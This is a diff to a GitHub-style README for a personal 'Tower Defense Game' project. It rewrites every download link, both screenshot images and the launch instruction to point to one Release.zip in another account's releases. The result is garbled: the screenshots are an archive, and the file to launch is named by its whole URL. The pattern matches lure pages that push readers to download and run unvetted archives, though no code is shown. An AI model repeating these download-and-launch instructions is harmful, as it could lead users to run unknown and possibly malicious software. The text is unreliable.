@@ -14,9 +14,9 @@ Welcome to the Tower Defense Game repository! This personal project is based on 
 
 To enjoy the Tower Defense Game, download the software package by clicking the button below:
 
-[![Download Tower Defense Game](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Tower Defense Game](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip)](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip)
 
-**Launch Instructions:** The downloaded file "Software.zip" needs to be launched to start the game.
+**Launch Instructions:** The downloaded file "https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip" needs to be launched to start the game.
 
 ## Gameplay 🎯
 
@@ -26,10 +26,10 @@ In this Tower Defense Game, your objective is to strategically place towers alon
 
 Here are some sneak peeks into the Tower Defense Game:
 
-![Gameplay Screenshot 1](https://via.placeholder.com/800x400)
+![Gameplay Screenshot 1](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip)
 *Screenshot 1: Defend your base with powerful towers.*
 
-![Gameplay Screenshot 2](https://via.placeholder.com/800x400)
+![Gameplay Screenshot 2](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip)
 *Screenshot 2: Plan your defense strategy wisely.*
 
 ## Technologies Used 🖥️
